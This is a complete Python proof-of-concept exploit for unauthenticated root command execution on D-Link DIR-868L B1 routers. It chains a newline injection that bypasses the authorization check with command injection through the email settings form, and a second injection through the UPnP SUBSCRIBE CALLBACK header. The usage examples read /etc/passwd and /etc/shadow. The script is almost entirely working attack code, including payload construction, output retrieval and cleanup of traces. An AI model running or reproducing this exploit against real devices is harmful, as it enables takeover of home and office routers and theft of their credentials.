#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DIR-868L B1 (FW 2.03b01) -- unauthenticated root RCE
PoC ID: DIR868L-AG0-RCE

Chain (all over plain HTTP, no credentials, no cookie):
  1) GET  /goform/form_emailsetting?x=AAA%0aAUTHORIZED_GROUP=0
     phpcgi decodes %0a and the xmldb ephp engine is FIRST-WINS, so the
     injected AUTHORIZED_GROUP=0 line beats the real one and header.php
     ($AUTHORIZED_GROUP>=0) lets the request through (500 -> 200).
  2) POST /goform/form_emailsetting (same bypass query)
     settingsChanged=1 + config.smtp_email_from_email_addr=<payload>
     + config.smtp_email_action=true writes /device/log/email/* and fires
     MYDLINK_TESTMAIL -> mdtestmail/mydlinkeventd -> phpsh MYDLINKMAIL.php
     as root, which emits an UNQUOTED `email -V -f <from>` shell line.
     The <from> value runs as root.
  3) GET  http://TARGET:49152/<mark>.gif
     The command output is redirected into /var/htdocs/upnp/LAN-1/<mark>.gif,
     which the UPnP LAN vhost serves read-only on port 49152.

Usage:
  python3 poc_DIR868L_AG0_RCE.py <target> <command...>
  python3 poc_DIR868L_AG0_RCE.py 192.168.0.1 cat /etc/passwd
  python3 poc_DIR868L_AG0_RCE.py 192.168.0.1 "uname -a; cat /proc/self/status"
  python3 poc_DIR868L_AG0_RCE.py --check 192.168.0.1          # gate check only
  python3 poc_DIR868L_AG0_RCE.py --no-clean 192.168.0.1 "uname -a"  # keep evidence file

  Flags are parsed before <target>; as a convenience --check / --no-clean / --raw
  are also accepted as the first words after <target>.

Options:
  --port N        management port (default 80)
  --fetch-port N  evidence vhost port (default 49152)
  --timeout N     seconds to wait for command output (default 20)
  --no-clean      do not restore the email test config / remove the evidence file
  --raw           write the fetched bytes to stdout without decoding

Notes:
  - The shell running the command is busybox ash. This firmware has no `id`,
    `head`, `ps` or `base64` applet; use `cat /proc/self/status`, `uname -a`,
    `cat /etc/passwd`, `cat /etc/shadow`, `ls`, `netstat`, `wget`, `printf`.
  - Spaces in <command...> are fine (sent as %20 and decoded by phpcgi).
  - Newlines are converted to ';' because a raw newline would break the
    xmldb template line. Unbalanced quotes are not handled.
  - By default the script restores the email baseline
    (enable=0, from/to/subject/server/... empty) and deletes the evidence
    file; use --no-clean to keep both.
"""

import argparse
import http.client
import random
import socket
import sys
import time
from urllib.parse import quote

POC_ID = "DIR868L-AG0-RCE"
INJ = "?x=AAA%0aAUTHORIZED_GROUP=0"
LAN_DIR = "/var/htdocs/upnp/LAN-1"
XMLDBC = "/usr/sbin/xmldbc"


class Http(object):
    def __init__(self, host, port, timeout=15.0):
        self.host = host
        self.port = port
        self.timeout = timeout

    def request(self, method, path, body=None, headers=None, port=None):
        conn = http.client.HTTPConnection(
            self.host, port or self.port, timeout=self.timeout)
        try:
            conn.request(method, path, body=body, headers=headers or {})
            resp = conn.getresponse()
            data = resp.read()
            return resp.status, data
        finally:
            conn.close()

    def get(self, path, port=None):
        return self.request("GET", path, port=port)


def log(msg):
    sys.stderr.write("[%s] %s\n" % (POC_ID, msg))


def make_name():
    return "d868ag0_%08x.gif" % random.getrandbits(32)


def gate_check(h):
    s0, _ = h.get("/goform/form_emailsetting")
    s1, b1 = h.get("/goform/form_emailsetting" + INJ)
    log("gate: plain GET -> %s | bypass GET -> %s" % (s0, s1))
    return s0, s1, b1


def build_form(fields):
    return "&".join("%s=%s" % (k, quote(v, safe="")) for k, v in fields)


def exploit(h, cmd, name, timeout):
    if not cmd.strip():
        raise ValueError("empty command")
    cmd = cmd.replace("\r", " ; ").replace("\n", " ; ").strip()
    payload = "a;cd %s;exec >%s 2>&1;%s;#" % (LAN_DIR, name, cmd)
    fields = [
        ("settingsChanged", "1"),
        ("config.smtp_email_addr", "x@y.z"),
        ("config.smtp_email_from_email_addr", payload),
        ("config.smtp_email_subject", POC_ID),
        ("config.smtp_email_server_addr", "127.0.0.1"),
        ("config.smtp_email_port", "25"),
        ("config.smtp_email_enable_smtp_auth", "false"),
        ("config.smtp_email_action", "true"),
    ]
    body = build_form(fields).encode()
    st, data = h.request(
        "POST", "/goform/form_emailsetting" + INJ, body=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    log("exploit POST -> %s %r" % (st, data[-12:]))
    if b"test ok" not in data:
        log("warning: expected 'test ok' in POST response")
    return st, data


def fetch_output(h, name, timeout, fetch_port):
    deadline = time.time() + timeout
    seen_200 = False
    last = b""
    while time.time() < deadline:
        try:
            st, body = h.get("/" + name, port=fetch_port)
        except (OSError, http.client.HTTPException):
            st, body = None, b""
        if st == 200:
            if seen_200 and body == last:
                return body, True
            seen_200 = True
            last = body
        time.sleep(0.5)
    return last, seen_200


def reset_email_config(h):
    """Form-only baseline restore: from/subject/server/... empty, enable=0."""
    body_a = build_form([
        ("settingsChanged", "1"),
        ("config.smtp_email_addr", "x@y.z"),
        ("config.smtp_email_from_email_addr", ""),
        ("config.smtp_email_subject", ""),
        ("config.smtp_email_server_addr", ""),
        ("config.smtp_email_port", ""),
        ("config.smtp_email_acc_name", ""),
        ("config.smtp_email_pass", ""),
        ("config.smtp_email_enable_smtp_auth", "false"),
        ("config.smtp_email_secret", "false"),
        ("config.smtp_email_action", "false"),
    ]).encode()
    h.request("POST", "/goform/form_emailsetting" + INJ, body=body_a,
              headers={"Content-Type": "application/x-www-form-urlencoded"})
    body_b = build_form([
        ("settingsChanged", "1"),
        ("config.smtp_email_addr", ""),
        ("config.smtp_email_action", "false"),
    ]).encode()
    h.request("POST", "/goform/form_emailsetting" + INJ, body=body_b,
              headers={"Content-Type": "application/x-www-form-urlencoded"})


def gena_cleanup(host, name, timeout=8.0):
    """Best-effort root channel: clear remaining email nodes + delete evidence."""
    cmds = [
        "%s -s /device/log/email/to \"\"" % XMLDBC,
        "%s -s /device/log/email/authenable 0" % XMLDBC,
        "%s -s /device/log/email/secret 0" % XMLDBC,
        "%s -s /device/log/email/enable 0" % XMLDBC,
        "rm -f %s/%s" % (LAN_DIR, name),
    ]
    cmd = ";".join(cmds).replace(" ", "${IFS}")
    cb = "<http://%s:1/;%s;>" % (host, cmd)
    req = ("SUBSCRIBE /gena.cgi?service=WANIPConn1 HTTP/1.1\r\n"
           "HOST: %s:49152\r\nNT: upnp:event\r\nCALLBACK: %s\r\n"
           "TIMEOUT: Second-1800\r\nContent-Length: 0\r\n"
           "Connection: close\r\n\r\n" % (host, cb))
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((host, 49152))
        s.sendall(req.encode())
        head = s.recv(400)
        s.close()
        return b"200" in head.split(b"\r\n", 1)[0]
    except OSError:
        return False


def main():
    ap = argparse.ArgumentParser(
        description="%s - DIR-868L B1 2.03b01 unauth root RCE" % POC_ID,
        usage="%(prog)s <target> <command...> [options]")
    ap.add_argument("target", help="router IP, e.g. 192.168.0.1")
    ap.add_argument("cmd", nargs=argparse.REMAINDER,
                    help="command to run as root (put options before target)")
    ap.add_argument("--check", action="store_true", help="gate check only")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--fetch-port", type=int, default=49152)
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--no-clean", action="store_true")
    ap.add_argument("--raw", action="store_true")
    args = ap.parse_args()

    # Allow the common "target --check" ordering despite REMAINDER.
    while args.cmd:
        tok = args.cmd[0]
        if tok == "--check":
            args.check = True
        elif tok == "--no-clean":
            args.no_clean = True
        elif tok == "--raw":
            args.raw = True
        else:
            break
        args.cmd.pop(0)

    h = Http(args.target, args.port, timeout=args.timeout)
    try:
        s0, s1, b1 = gate_check(h)
    except (OSError, http.client.HTTPException) as exc:
        log("cannot reach http://%s:%d (%s)" % (args.target, args.port, exc))
        return 2
    if s1 != 200:
        log("gate bypass failed (bypass GET -> %s, body %r)" % (s1, b1[:40]))
        return 1
    if args.check:
        log("gate bypass OK (plain %s -> bypass %s)" % (s0, s1))
        return 0
    if not args.cmd:
        log("no command given; usage: %s <target> <command...>" % sys.argv[0])
        return 2

    cmd = " ".join(args.cmd)
    name = make_name()

    # MYDLINK_TESTMAIL is asynchronous; a single POST occasionally gets lost in
    # a busy emulator/daemon, so re-arm the same payload up to 3 times.
    attempts = 3
    per_attempt = max(4.0, args.timeout / attempts)
    body, ok = b"", False
    for attempt in range(1, attempts + 1):
        try:
            exploit(h, cmd, name, args.timeout)
        except ValueError as exc:
            log("invalid command: %s" % exc)
            return 2
        except (OSError, http.client.HTTPException) as exc:
            log("exploit request failed (attempt %d): %s" % (attempt, exc))
            continue
        body, ok = fetch_output(h, name, per_attempt, args.fetch_port)
        if ok:
            break
        log("no output yet after %.0fs (attempt %d/%d)"
            % (per_attempt, attempt, attempts))

    if ok:
        log("evidence: %d byte(s) from http://%s:%d/%s"
            % (len(body), args.target, args.fetch_port, name))
    else:
        log("no evidence served on :%d/%s within %.0fs"
            % (args.fetch_port, name, args.timeout))

    if args.raw:
        sys.stdout.buffer.write(body)
        sys.stdout.buffer.flush()
    else:
        text = body.decode("utf-8", "replace")
        sys.stdout.write(text)
        if text and not text.endswith("\n"):
            sys.stdout.write("\n")
        sys.stdout.flush()

    if not args.no_clean:
        try:
            reset_email_config(h)
            gena_ok = gena_cleanup(args.target, name)
            log("cleanup: email baseline reset, evidence removed (gena=%s)"
                % ("ok" if gena_ok else "n/a"))
        except (OSError, http.client.HTTPException) as exc:
            log("cleanup incomplete: %s" % exc)
    else:
        log("kept evidence file (http://%s:%d/%s) and email test config"
            % (args.target, args.fetch_port, name))

    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
